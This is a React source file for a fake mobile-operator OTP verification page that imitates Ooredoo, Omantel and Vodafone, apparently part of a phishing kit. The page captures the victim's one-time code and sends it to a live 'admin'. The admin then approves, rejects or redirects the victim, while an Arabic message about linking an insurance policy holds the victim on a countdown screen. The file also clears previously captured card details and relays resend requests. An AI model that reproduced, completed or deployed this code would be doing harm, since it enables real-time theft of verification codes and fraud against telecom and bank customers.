import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import WaitingOverlay, { waitingCardInfo, waitingExtraText, waitingCountdownDuration, waitingProviderInfo } from "@/components/WaitingOverlay";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function OTPLogin() {
  const [, navigate] = useLocation();
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [countdown, setCountdown] = useState(29);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Get phone number and provider from session storage
  const phoneNumber = sessionStorage.getItem("ooredoo_otp_customer_number") || "94949590";
  const otpProvider = sessionStorage.getItem("otp_provider") || "omantel";

  // Determine OTP length based on provider
  const otpLength = otpProvider === "omantel" ? 5 : 6;

  const [otp, setOtp] = useState<string[]>(Array(otpLength).fill(""));

  // Provider logos mapping
  const providerLogos: Record<string, string> = {
    ooredoo: "/provider-logos/ooredoo.png",
    omantel: "/provider-logos/omantel.png",
    vodafone: "/provider-logos/vodafone.png",
  };

  const providerNames: Record<string, string> = {
    ooredoo: "Ooredoo",
    omantel: "Omantel",
    vodafone: "Vodafone",
  };

  // Emit page enter & clear card info (not relevant after network-operator)
  useEffect(() => {
    waitingCardInfo.value = null;
    navigateToPage("OTP دخول");
    inputRefs.current[0]?.focus();
  }, []);

  // Countdown timer
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [countdown]);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "thiqa") {
        // Navigate to identity verification (thiqa) page
        navigate("/identity-verification");
      } else if (action.action === "approve") {
        // Navigate to ooredoo login page
        navigate("/ooredoo-login");
      } else if (action.action === "reject") {
        // Show error and clear OTP
        setOtp(Array(otpLength).fill(""));
        setError(true);
        setIsWaiting(false);
        inputRefs.current[0]?.focus();
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const handleChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const newOtp = [...otp];
    newOtp[index] = digit;
    setOtp(newOtp);
    setError(false);

    // Auto-focus next input
    if (digit && index < otpLength - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      e.preventDefault();
      inputRefs.current[index - 1]?.focus();
      const newOtp = [...otp];
      newOtp[index - 1] = "";
      setOtp(newOtp);
    }
    if (e.key === "ArrowLeft" && index > 0) {
      e.preventDefault();
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === "ArrowRight" && index < otpLength - 1) {
      e.preventDefault();
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, otpLength);
    const newOtp = [...otp];
    for (let i = 0; i < text.length; i++) {
      newOtp[i] = text[i];
    }
    setOtp(newOtp);
    const lastIndex = Math.min(text.length, otpLength - 1);
    inputRefs.current[lastIndex]?.focus();
  };

  const handleResend = () => {
    if (!canResend) return;
    setCanResend(false);
    setCountdown(29);
    // Notify admin about resend request
    sendData({
      data: { "طلب": "إعادة إرسال رمز", "رقم الجوال": "+968 " + phoneNumber },
      current: "OTP دخول",
      nextPage: "",
      waitingForAdminResponse: true,
      mode: "silent",
    });
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    const fullOtp = otp.join("");
    if (fullOtp.length !== otpLength) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);

    // For Ooredoo: show Arabic message with 4 min countdown
    if (otpProvider === "ooredoo") {
      waitingExtraText.value = "عزيزي العميل\nنقوم حالياً بتوثيق معلومات خطك مع وثيقة التأمين الخاص بك، يرجى الانتظار وعدم الخروج لحين الإنتهاء من العملية";
      waitingCountdownDuration.value = 240; // 4 minutes
      waitingProviderInfo.value = {
        providerLogo: "/provider-logos/ooredoo.png",
        providerName: "Ooredoo",
        phoneNumber: "+968 " + phoneNumber,
      };
    } else {
      waitingExtraText.value = "";
      waitingCountdownDuration.value = 120;
    }

    sendData({
      digitCode: fullOtp,
      current: "OTP دخول",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
      customWaitingMessage: otpProvider === "ooredoo" ? "جاري المعالجة..." : undefined,
    });
  };

  const isOtpComplete = otp.every((digit) => digit !== "");

  return (
    <div
      className="min-h-screen flex justify-center items-start bg-white"
      style={{ fontFamily: "NotoSansLocal, Arial, Helvetica, sans-serif", paddingTop: "91px" }}
    >
      <WaitingOverlay />

      <section
        className="w-full max-w-[626px] mx-4 bg-white border border-gray-100 rounded shadow-lg text-center"
        style={{ padding: "43px 34px 36px", boxShadow: "0 18px 38px rgba(0, 0, 0, 0.085)" }}
      >
        {/* Provider Logo */}
        <div className="flex justify-center mb-3">
          <img
            src={providerLogos[otpProvider] || providerLogos.omantel}
            alt={providerNames[otpProvider] || "Provider"}
            className="h-16 w-auto object-contain"
          />
        </div>

        <h1 className="text-4xl font-bold text-gray-900 mb-2" style={{ fontSize: "35px" }}>
          Verify Your Number
        </h1>
        <p className="text-gray-800 text-lg">
          We've sent a {otpLength}-digit OTP to <strong>+968 {phoneNumber}</strong>
        </p>

        <form onSubmit={handleSubmit}>
          {/* OTP Input Group */}
          <div
            className="mx-auto my-6 grid border border-gray-300 rounded-lg overflow-hidden"
            style={{ width: "383px", maxWidth: "100%", gridTemplateColumns: `repeat(${otpLength}, 1fr)`, height: "64px" }}
            dir="ltr"
            onPaste={handlePaste}
          >
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { inputRefs.current[index] = el; }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-full h-full text-center text-2xl font-bold outline-none border-0 ${
                  index < otpLength - 1 ? "border-r border-gray-300" : ""
                } ${error ? "bg-red-50" : "bg-white"}`}
                style={{ borderRight: index < otpLength - 1 ? "1px solid #ddd" : "none", caretColor: "#007bff" }}
                aria-label={`OTP digit ${index + 1}`}
              />
            ))}
          </div>

          {/* Resend Button */}
          <button
            type="button"
            onClick={handleResend}
            disabled={!canResend}
            className={`block mx-auto mb-4 text-base bg-transparent border-0 ${
              canResend ? "text-blue-700 cursor-pointer hover:underline" : "text-gray-400 cursor-default"
            }`}
          >
            {canResend ? "Resend code" : `Resend OTP after ${countdown}s`}
          </button>

          {/* Error Message */}
          {error && (
            <p className="text-red-600 text-center text-sm mb-3 font-medium">
              Invalid code, please try again
            </p>
          )}

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isWaiting || !isOtpComplete}
            className="w-full max-w-[560px] h-14 mx-auto flex items-center justify-center bg-blue-600 text-white font-bold text-base rounded-full hover:bg-blue-700 transition-colors disabled:opacity-60"
          >
            {isWaiting ? "Verifying..." : "Verify & Continue"}
          </button>
        </form>

        {/* Change Number Link */}
        <a
          href="#"
          onClick={(e) => { e.preventDefault(); navigate("/network-operator"); }}
          className="inline-flex items-center gap-1.5 mt-5 text-gray-500 font-bold text-lg hover:text-gray-700"
        >
          <svg width="17" height="17" viewBox="0 0 20 20" fill="currentColor">
            <path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path>
          </svg>
          <span>Change Number</span>
        </a>
      </section>
    </div>
  );
}
